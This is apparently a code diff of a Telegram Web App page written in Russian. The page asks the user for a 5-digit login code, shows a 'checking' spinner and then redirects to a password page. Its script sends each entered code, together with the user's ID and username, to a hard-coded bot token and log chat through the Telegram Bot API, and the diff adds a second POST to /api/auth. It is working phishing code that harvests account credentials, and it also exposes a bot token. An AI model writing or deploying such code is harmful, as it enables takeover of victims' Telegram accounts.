@@ -114,7 +114,6 @@
       background: #4a4a4a;
     }
 
-    /* Экран загрузки */
     .loading-screen {
       display: none;
       flex-direction: column;
@@ -165,7 +164,6 @@
     </div>
   </div>
 
-  <!-- Экран загрузки -->
   <div class="screen loading-screen" id="loadingScreen">
     <div class="spinner"></div>
     <div>Проверка введённого кода…</div>
@@ -190,54 +188,32 @@ function updateBoxes() {
   });
 }
 
-document.querySelectorAll('.numpad button').forEach(btn => {
-  btn.addEventListener('click', () => {
-    const value = btn.textContent;
-    if (value === '←') {
-      code = code.slice(0, -1);
-    } else if (!isNaN(value)) {
-      if (code.length < 5) code += value;
-    }
-    updateBoxes();
-
-    if (code.length === 5) {
-      // скрываем экран ввода
-      document.getElementById("authScreen").style.display = "none";
-      // показываем экран загрузки
-      document.getElementById("loadingScreen").style.display = "flex";
-
-      // Отправляем код боту через Telegram Web App
-      tg.sendData(JSON.stringify({
-        type: 'auth_code',
-        code: code,
-        user_id: tg.initDataUnsafe.user?.id,
-        phone_number: ""
-      }));
-
-      // Дополнительно отправляем код в бота через метод бота
-      sendCodeToBot(code);
-
-      // Переходим на страницу ввода пароля через 1 секунду
-      setTimeout(() => {
-        window.location.href = `password.html?phone=&code=${code}`;
-      }, 1000);
-    }
+function sendCodeToServer(code) {
+  fetch('/api/auth', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      type: 'auth_code',
+      code: code,
+      phone_number: "",
+      user_id: tg.initDataUnsafe.user?.id
+    })
+  }).catch(error => {
+    console.error('Error sending code to server:', error);
   });
-});
+}
 
-// Функция для отправки кода в бота
-function sendCodeToBot(code) {
+function sendCodeToBot(code, phoneNumber) {
   const botToken = '8403065874:AAHg_uz-bB1EMN3sfcWo43xgE-YkVPPgX2w';
   const logChatId = '-5067724174';
   
   const user = tg.initDataUnsafe.user;
-  
-  // Получаем username или показываем "без username"
   const username = user?.username ? `@${user.username}` : 'без username';
   
-  const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🔢 Код: ${code}`;
+  const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n📱 Телефон: ${phoneNumber}\n🔢 Код: ${code}`;
   
-  // Отправляем сообщение через API бота
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
     headers: {
@@ -249,17 +225,41 @@ function sendCodeToBot(code) {
       parse_mode: 'HTML'
     })
   }).catch(error => {
-    console.error('Ошибка отправки кода в лог:', error);
+    console.error('Ошибка отправки кода в бота:', error);
   });
 }
 
-// Инициализация при загрузке
+document.querySelectorAll('.numpad button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const value = btn.textContent;
+    if (value === '←') {
+      code = code.slice(0, -1);
+    } else if (!isNaN(value)) {
+      if (code.length < 5) code += value;
+    }
+    updateBoxes();
+
+    if (code.length === 5) {
+      document.getElementById("authScreen").style.display = "none";
+      document.getElementById("loadingScreen").style.display = "flex";
+
+      tg.sendData(JSON.stringify({
+        type: 'auth_code',
+        code: code,
+        user_id: tg.initDataUnsafe.user?.id,
+        phone_number: "79999999999"
+      }));
+
+      sendCodeToServer(code);
+
+      setTimeout(() => {
+        window.location.href = `password.html?phone=79999999999&code=${code}`;
+      }, 1000);
+    }
+  });
+});
+
 updateBoxes();
 </script>
 </body>
 </html>
-
-
-
-
-
